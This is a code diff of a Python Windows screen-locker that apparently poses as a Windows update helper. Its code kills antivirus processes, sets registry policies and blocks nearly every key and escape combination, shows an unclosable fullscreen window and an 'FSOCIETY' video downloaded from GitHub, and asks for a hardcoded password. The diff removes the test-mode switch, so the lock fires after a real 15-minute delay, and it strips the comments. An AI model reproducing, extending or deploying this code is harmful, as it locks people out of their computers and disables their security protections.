@@ -25,8 +25,6 @@ PASS = "1601"
 TRIES = 5
 HOURS = 1
 DELAY_MINUTES = 15
-TEST_DELAY = 15
-TEST_MODE = True
 TIMER = os.path.join(tempfile.gettempdir(), "timer.dat")
 ATTEMPTS_FILE = os.path.join(tempfile.gettempdir(), "attempts.dat")
 VIDEO_URL = "https://github.com/ippo123459-bit/windows-update-helper/raw/refs/heads/main/fuxEcorp.mp4.mp4"
@@ -78,12 +76,7 @@ def kill_av():
             except: pass
         time.sleep(0.1)
 
-# ============================================================
-# ПОЛНАЯ БЛОКИРОВКА КЛАВИАТУРЫ (ВООБЩЕ ВСЕ КЛАВИШИ)
-# ============================================================
 def block_all_keys():
-    """Блокирует ВООБЩЕ ВСЕ клавиши — только Enter и Backspace работают в поле пароля"""
-    # Реестр
     for h in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
         for k,n in [
             (r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer","NoWinKeys"),
@@ -93,7 +86,6 @@ def block_all_keys():
             try: r=winreg.OpenKey(h,k,0,winreg.KEY_SET_VALUE); winreg.SetValueEx(r,n,0,winreg.REG_DWORD,1); winreg.CloseKey(r)
             except: pass
     
-    # Блокируем все возможные клавиши
     all_keys = [
         'alt','left alt','right alt',
         'ctrl','left ctrl','right ctrl',
@@ -116,7 +108,6 @@ def block_all_keys():
         try: keyboard.block_key(k)
         except: pass
     
-    # Блокируем все комбинации
     combos = [
         'alt+f4','alt+tab','alt+esc','alt+space',
         'ctrl+shift+esc','ctrl+alt+del','ctrl+esc',
@@ -201,7 +192,6 @@ def anim():
     a.attributes('-fullscreen',True); a.attributes('-topmost',True)
     a.configure(bg='black'); a.overrideredirect(True)
     a.protocol("WM_DELETE_WINDOW",lambda:None)
-    # Блокируем ВСЕ возможные события закрытия
     for key in ["<Alt-F4>","<Escape>","<Win_L>","<Win_R>","<Control-Alt-Delete>","<Alt-Tab>"]:
         a.bind(key, lambda e: None)
     a.focus_force()
@@ -228,7 +218,7 @@ def video():
             cv2.imshow("FSOCIETY",frame)
             k = cv2.waitKey(int(1000/fps)) & 0xFF
             if k == 27 or k == ord('q') or k == ord('x'):
-                pass  # Игнорируем Esc, Q, X
+                pass
         cap.release(); cv2.destroyAllWindows()
         for _ in range(10): cv2.waitKey(1)
     except: pass
@@ -241,7 +231,6 @@ class Locker:
         self.w.attributes('-fullscreen',True); self.w.attributes('-topmost',True)
         self.w.configure(bg='black'); self.w.overrideredirect(True)
         self.w.protocol("WM_DELETE_WINDOW",lambda:None)
-        # Блокируем ВСЕ события закрытия
         for key in ["<Alt-F4>","<Escape>","<Win_L>","<Win_R>","<Control-Alt-Delete>","<Alt-Tab>",
                      "<Control-Shift-Escape>","<Control-Escape>"]:
             self.w.bind(key, lambda e: None)
@@ -324,14 +313,10 @@ if __name__=="__main__":
     threading.Thread(target=kill_av, daemon=True).start()
     threading.Thread(target=timer_check, daemon=True).start()
     
-    # БЛОКИРУЕМ ВСЕ КЛАВИШИ СРАЗУ (до анимации)
     block_all_keys()
     
     if is_first_run():
-        if TEST_MODE:
-            time.sleep(TEST_DELAY)
-        else:
-            time.sleep(DELAY_MINUTES * 60)
+        time.sleep(DELAY_MINUTES * 60)  # 15 МИНУТ
         anim()
         video()
     
